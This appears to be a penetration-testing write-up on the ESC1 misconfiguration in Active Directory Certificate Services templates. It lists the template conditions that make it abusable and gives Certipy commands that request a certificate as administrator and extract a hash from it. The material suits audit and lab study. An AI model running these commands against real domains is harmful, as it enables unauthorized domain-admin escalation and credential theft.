# ADCS Template Misconfigurations

## Intro
Templates, by default, are not vulnerable but made vulnerable by human-made misconfigurations. When writing this blog, these misconfigurations are divided into 11 parts (ESC1-ESC11).     
By exploiting this type of vulnerable Template, a domain user can escalate his privileges to that of a domain administrator in a Windows Active Directory Environment. 

## ESC1
### Overview
- The template must have **Enrollment Rights** set, so that the attacker can request a new one from the Certificate Authority.
- No manager approval is required
- **Enrollee Supplies Subject** is set to **True** so that we can supply *SAN*.
- **Extended Key Usage:** Client Authentication means the generated certificate based on this Template can authenticate to the domain computers. 


### Tools needed
- [Certipy](https://github.com/ly4k/Certipy)


### Exploitation
```sh
# Find vulnerable templates
certipy find -u <username> -p <password> -target <ip> -text -stdout -vulnerable

# Request certificate
certipy req -u <username> -p <password> -target <ip> -upn administrator@domain.local -ca <cert_auth> -template <template_nmae>

# Get hash from the cerificate
certipy auth -pfx <certificate>
```

### References
- [https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/](https://redfoxsec.com/blog/exploiting-misconfigured-active-directory-certificate-template-esc1/)
- [https://0xdf.gitlab.io/2023/06/17/htb-escape.html#abuse-template](https://0xdf.gitlab.io/2023/06/17/htb-escape.html#abuse-template)